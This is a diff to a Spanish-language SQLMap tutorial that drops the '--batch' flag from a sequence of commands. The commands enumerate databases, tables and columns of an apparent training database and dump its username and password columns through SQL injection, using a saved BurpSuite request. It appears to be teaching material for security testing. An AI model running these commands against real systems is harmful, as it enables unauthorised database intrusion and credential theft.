@@ -182,6 +182,7 @@ Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir
 	# current-user = Muestra el nombre del usuario actual
 	# roles = Muestra el rol de cada usuario 
 ```
+
 ## Ejemplo 1
 
 ```bash 
@@ -274,7 +275,7 @@ Podemos usar los archivos de BurpSuite para ingresarlos en la herramienta SQLMap
 ```
 
 ```bash
-❯ sqlmap -r example.req -p searchitem --batch --dbs
+❯ sqlmap -r example.req -p searchitem --dbs
 
 	# r = File con el contenido del Proxy de BurpSuite .req
 	# p = El campo donde queremos que pruebe 
@@ -285,7 +286,7 @@ Podemos usar los archivos de BurpSuite para ingresarlos en la herramienta SQLMap
 Una vez obtenidas las DBs podemos apuntar a las **tablas** de una base especifica
 
 ```bash
-❯ sqlmap -r example.req -p searchitem --batch -D sqltraining --tables
+❯ sqlmap -r example.req -p searchitem -D sqltraining --tables
 
 	# r = File con el contenido del Proxy de BurpSuite .req
 	# p = El campo donde queremos que pruebe 
@@ -297,7 +298,7 @@ Una vez obtenidas las DBs podemos apuntar a las **tablas** de una base especific
 Una vez obtenidas las tablas, ahora vamos a querer que nos enumere las **columnas**
 
 ```bash
-❯ sqlmap -r example.req -p searchitem --batch -D sqltraining -T users --columns
+❯ sqlmap -r example.req -p searchitem -D sqltraining -T users --columns
 
 	# r = File con el contenido del Proxy de BurpSuite .req
 	# p = El campo donde queremos que pruebe 
@@ -310,7 +311,7 @@ Una vez obtenidas las tablas, ahora vamos a querer que nos enumere las **columna
 Una vez obtenidas las columnas podemos hacer que nos muestre **(Dumpear)** sus valores
 
 ```bash
-❯ sqlmap -r example.req -p searchitem --batch -D sqltraining -T users -C username,password --dump
+❯ sqlmap -r example.req -p searchitem -D sqltraining -T users -C username,password --dump
 
 	# r = File con el contenido del Proxy de BurpSuite .req
 	# p = El campo donde queremos que pruebe 
